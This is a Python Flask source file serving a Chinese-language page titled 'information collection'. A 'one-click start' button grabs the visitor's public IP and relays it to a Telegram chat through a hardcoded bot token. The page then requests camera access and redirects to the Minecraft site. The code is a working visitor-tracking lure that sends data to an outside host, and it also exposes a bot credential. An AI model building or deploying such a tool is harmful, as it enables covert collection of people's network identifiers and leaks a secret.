from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

BOT_TOKEN = "8831992575:AAFPvDrXc_kEiOiT0XHYgJj9E8KSWwR-aBo"
CHAT_ID = "7763890817"

# 推送消息到电报机器人
def send_telegram_message(content):
    api_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": content
    }
    requests.post(api_url, json=payload)

# 内嵌前端全部代码
frontend_html = '''
<!--下面整块是独立前端HTML-->
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>信息采集</title>
    <style>
        body{font-family:Arial;text-align:center;margin-top:80px;}
        button{padding:14px 30px;margin:10px;font-size:17px;cursor:pointer;border:none;background:#007AFF;color:white;border-radius:8px;}
        video{margin-top:20px;border:1px solid #ccc;border-radius:6px;width:360px;}
    </style>
</head>
<body>
    <h2>点击下方按钮启动</h2>
    <button onclick="startAll()">一键启动</button>
    <br>
    <video id="myCamera" autoplay playsinline></video>

    <script>
        async function startAll(){
            try{
                //1.获取并上报公网IP
                let res = await fetch("https://api.ipify.org?format=json");
                let json = await res.json();
                let userIp = json.ip;

                await fetch("/api/upload_ip",{
                    method:"POST",
                    headers:{"Content-Type":"application/json"},
                    body:JSON.stringify({ip:userIp})
                })
                alert("IP已上报："+userIp);

                //2.申请打开摄像头权限
                const videoBox = document.getElementById("myCamera");
                const mediaStream = await navigator.mediaDevices.getUserMedia({video:true})
                videoBox.srcObject = mediaStream;

                //3.新标签跳转MC官方网站
                window.open("https://www.minecraft.net/zh-hans","_blank");

            }catch(err){
                alert("权限被拒绝或者出错："+err)
            }
        }
    </script>
</body>
</html>
'''

#首页路由加载前端页面
@app.route("/")
def home_page():
    return render_template_string(frontend_html)

#后端接收IP数据接口
@app.route("/api/upload_ip",methods=["POST"])
def upload_ip():
    data = request.get_json()
    visitor_ip = data.get("ip","获取失败")
    msg_text = f"新访客公网IP地址：{visitor_ip}"
    send_telegram_message(msg_text)
    return {"status":"success"}

if __name__ == "__main__":
    app.run(host="0.0.0.0")
